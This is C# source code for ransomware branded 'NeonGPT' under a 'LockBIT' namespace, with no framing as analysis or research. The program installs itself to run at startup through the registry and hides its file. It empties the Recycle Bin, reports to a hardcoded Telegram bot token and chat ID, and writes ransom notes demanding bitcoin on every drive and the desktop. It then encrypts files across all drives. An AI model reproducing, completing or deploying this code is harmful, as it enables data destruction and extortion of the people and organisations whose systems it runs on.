using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

#nullable disable
namespace LockBIT
{
    internal static class Program
    {
        public static readonly string DesktopDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static readonly string systemID = SystemID.GetSystemID();
        public static readonly string email1 = "NeonGPT@Cyberfear.com";
        private static readonly string Telegram = "https://t.me/Neon_GPT";
        public static string Extention = "NeonGPT";
        private static readonly HashSet<string> ExcludedExtensionsAndPaths = new HashSet<string>((IEqualityComparer<string>)StringComparer.OrdinalIgnoreCase)
        {
            ".exe",
            ".msi",
            ".NeonGPT",
            ".dll",
            ".iso",
            "Readme",
            nameof(systemID)
        };
        private static readonly string WindowsDirectory = "C:\\Windows";
        public static string randomName = KeyGenerator.GetUniqueKey(10);

        // 키 초기화를 먼저 수행
        public static string Key { get; } = KeyGenerator.GetUniqueKey(256);

        // 키 초기화 후 PersonalID 초기화
        public static string PersonalID { get; } = InitializePersonalID();

        // PersonalID 초기화 메서드
        private static string InitializePersonalID()
        {
            // 키 설정
            Encryption.SetKeyFromString(Key);
            // PersonalID 생성
            return Encryption.Run();
        }

        public static string Message = $"Your network has been penetrated.\r\n\r\n\r\nAll files on each host in the network have been encrypted with a strong algorithm.\r\n\r\n\r\nBackups were either encrypted\r\nShadow copies also removed, so F8 or any other methods may damage encrypted data but not recover.\r\n\r\n\r\nWe exclusively have decryption software for your situation.\r\nMore than a year ago, world experts recognized the impossibility of deciphering by any means except the original decoder.\r\nNo decryption software is available in the public.\r\nAntiviruse companies, researchers, IT specialists, and no other persons cant help you decrypt the data.\r\n\r\n\r\nDO NOT RESET OR SHUTDOWN - files may be damaged.\r\nDO NOT DELETE readme files.\r\n\r\n \r\n\r\nTo confirm our honest intentions.Send 2 different random files and you will get it decrypted.\r\nIt can be from different computers on your network to be sure that one key decrypts everything.\r\n2 files we unlock for free\r\n\r\n\r\nTo get info (decrypt your files) contact us at telegram first . if you don't get answer in 24 hours\r\nthen write us a email\r\n\r\nContact information :\r\n\r\nMail 1 : {Program.email1}\r\n\r\nTelegram: {Program.Telegram}\r\n\r\nUniqueID: {Program.systemID}\r\n\r\nPublicKey: {Program.PersonalID}\r\n\r\nYou will receive btc address for payment in the reply letter\r\n\r\n\r\nNo system is safe!\r\n\r\n";

        [DllImport("shell32.dll", CharSet = CharSet.Auto)]
        public static extern int SHFileOperation(ref Program.SHFILEOPSTRUCT FileOp);

        public static string[] disk => Directory.GetLogicalDrives();

        // 나머지 코드는 기존과 동일...

        private static async Task Main()
        {
            Program.Startup();
            Program.WipeRecycleBin();
            Program.TelSender();
            Program.ReadMeMaker();
            try
            {
                string[] drives = Environment.GetLogicalDrives();
                List<Task> tasks = new List<Task>();
                ParallelLoopResult parallelLoopResult = await Task.Run<ParallelLoopResult>((Func<ParallelLoopResult>)(() => Parallel.ForEach<string>((IEnumerable<string>)drives, (Action<string>)(drive =>
                {
                    LE.RunEncrypt(drive);
                    SE.RunEncrypt(drive);
                }))));
                await Task.WhenAll((IEnumerable<Task>)tasks);
                Console.ReadKey();
                tasks = (List<Task>)null;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        public static bool ShouldExclude(string filePath, long fileSize)
        {
            foreach (string extensionsAndPath in Program.ExcludedExtensionsAndPaths)
            {
                string str = filePath.Substring(filePath.LastIndexOf('\\') + 1);
                if (str.EndsWith(extensionsAndPath, StringComparison.OrdinalIgnoreCase) || str.StartsWith(extensionsAndPath) || filePath.StartsWith(Program.WindowsDirectory))
                    return true;
            }
            return filePath.Contains("\\AppData\\") && fileSize < 1048576L;
        }

        private static void TelSender()
        {
            try
            {
                string str = $"\r\n**Unique ID:**\r\n``````\r\n**--------------------**\r\n**Personal ID:**\r\n``````";
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://api.telegram.org/bot7396666136:AAF4CYFWOPRp3jtcgri8HNbxU7N3a1krEGQ/sendMessage?chat_id=7305863906&parse_mode=markdown&text=" + WebUtility.UrlEncode(str));
                httpWebRequest.Method = "GET";
                using (HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse())
                {
                    using (Stream responseStream = response.GetResponseStream())
                    {
                        using (StreamReader streamReader = new StreamReader(responseStream))
                            streamReader.ReadToEnd();
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }

        private static void WipeRecycleBin()
        {
            foreach (string logicalDrive in Directory.GetLogicalDrives())
            {
                try
                {
                    if (Directory.Exists(logicalDrive + "$RECYCLE.BIN"))
                        Directory.Delete(logicalDrive + "$RECYCLE.BIN", true);
                }
                catch (Exception ex)
                {
                }
            }
        }

        public static void Startup()
        {
            try
            {
                string name = Assembly.GetEntryAssembly().GetName().Name;
                string location = Assembly.GetExecutingAssembly().Location;
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    registryKey.SetValue(name, (object)location);
                System.IO.File.SetAttributes(location, System.IO.File.GetAttributes(location) | FileAttributes.Hidden);
            }
            catch (Exception ex)
            {
            }
        }

        public static void ReadMeMaker()
        {
            foreach (string logicalDrive in Directory.GetLogicalDrives())
            {
                try
                {
                    if (System.IO.File.Exists(logicalDrive + "Readme.txt"))
                        System.IO.File.WriteAllText($"{logicalDrive}\\Readme-{Program.randomName}.txt", Program.Message);
                    else
                        System.IO.File.WriteAllText(logicalDrive + "Readme.txt", Program.Message);
                }
                catch (Exception ex)
                {
                }
            }
            try
            {
                if (System.IO.File.Exists(Program.DesktopDirectory + "\\Readme.txt"))
                    System.IO.File.WriteAllText($"{Program.DesktopDirectory}\\Readme-{Program.randomName}.txt", Program.Message);
                else
                    System.IO.File.WriteAllText(Program.DesktopDirectory + "\\Readme.txt", Program.Message);
            }
            catch (Exception ex)
            {
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct SHFILEOPSTRUCT
        {
            public IntPtr hwnd;
            [MarshalAs(UnmanagedType.U4)]
            public int wFunc;
            public string pFrom;
            public string pTo;
            public ushort fFlags;
            [MarshalAs(UnmanagedType.Bool)]
            public bool fAnyOperationsAborted;
            public IntPtr hNameMappings;
            public string lpszProgressTitle;
        }
    }
}
